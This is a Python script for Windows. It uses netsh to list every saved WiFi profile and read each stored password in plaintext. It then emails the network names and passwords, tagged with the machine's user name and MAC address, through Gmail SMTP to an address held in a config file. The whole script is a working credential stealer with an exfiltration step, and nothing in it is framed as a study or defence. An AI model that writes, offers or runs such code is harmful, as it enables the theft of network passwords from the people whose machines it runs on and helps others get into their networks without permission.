import subprocess
import smtplib
from email.message import EmailMessage
from decouple import config
import getpass, re, uuid

def get_mac_address():
    return ':'.join(re.findall('..', '%012x' % uuid.getnode()))

def send_email(message):
    email = EmailMessage()
    email["from"] = config('EMAIL_FROM')
    email["to"] = config('EMAIL_TO')
    email["subject"] = f"WiFi SSIDs and Passwords from {getpass.getuser()} | MAC address: {get_mac_address()}"
    email.set_content(message)

    with smtplib.SMTP(host="smtp.gmail.com", port=587) as smtp:
        smtp.ehlo()
        smtp.starttls()
        # Login using username and password to email.
        # Remember to set email so it allow less secure apps if you are using Gmail.
        smtp.login(config('EMAIL_LOGIN'), config('EMAIL_PASSWORD'))
        smtp.send_message(email)

if __name__ == "__main__":
    print("process")

    p = ["netsh", "wlan", "show", "profiles"]
    data = subprocess.check_output(p).decode("utf-8").split("\n")
    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
    message = ''
    for i in profiles:
        try:
            results = subprocess.check_output(["netsh", "wlan", "show", "profiles", i, "key=clear"], shell=True,stderr=subprocess.STDOUT).decode("utf-8").split("\n")
        except subprocess.CalledProcessError as e:
            print(e.output)
            continue
        # print(results)
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            print("{:<30} | {:<}".format(i, results[0]))
            message += "{:<30} | {:<}".format(i, results[0]) + "\n"

        except IndexError:
            print("{:<30} | {:<}".format(i, ""))
            message += "{:<30} | {:<}".format(i, "") + "\n"

    send_email(message)